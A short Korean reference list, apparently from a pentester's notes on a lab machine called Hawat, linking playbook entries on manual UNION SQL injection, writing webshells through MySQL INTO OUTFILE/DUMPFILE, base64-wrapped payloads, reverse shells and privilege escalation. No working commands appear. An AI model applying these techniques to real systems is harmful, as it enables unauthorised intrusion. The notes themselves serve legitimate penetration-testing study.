- CVE 없음 — 커스텀 애플리케이션의 SQL 인젝션(OWASP A03: Injection)
- MySQL `INTO OUTFILE` / `secure_file_priv`: <https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv>
- Nextcloud WebDAV 경로 관례: `/remote.php/dav/files/<user>/`
- [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]] · [[_PLAYBOOK#B-34. root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승]] · [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]]
- [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-61. 관측은 맞는데 결론이 어긋난다]]
- [[_PLAYBOOK#A-1-15. 웹이 상위 1000 포트 «밖»에만 있다]] · [[_PLAYBOOK#A-1-16. Arch Linux 는 경로 관례가 다르다]]
- [[_PLAYBOOK#A-2-13. 노출된 소스와 «배포본»이 다르다 — 소스는 지도지 정답지가 아니다]] · [[_PLAYBOOK#A-2-14. 웹셸을 심을 웹루트를 «틀린 곳»에 골랐다]]
- [[_PLAYBOOK#A-38. `python3` 가 없어 TTY 업그레이드가 안 된다]]
- [[_PLAYBOOK#B-1-21. 노출된 소스를 «먼저» 확보한다 — 화이트박스가 블랙박스보다 압도적으로 빠르다]] · [[_PLAYBOOK#B-1-22. Nextcloud · ownCloud 를 만나면 WebDAV 를 직접 때린다]]
- [[Hub]] — 서비스가 root 로 구동되어 권한상승이 없던 동일 패턴
- [[Squid]] — `INTO DUMPFILE` + hex 리터럴로 웹셸 작성
- [[Exfiltrated]] — 인용 중첩을 base64 로 회피
- [[01. Pentest Foundations]] — Hawat 항목
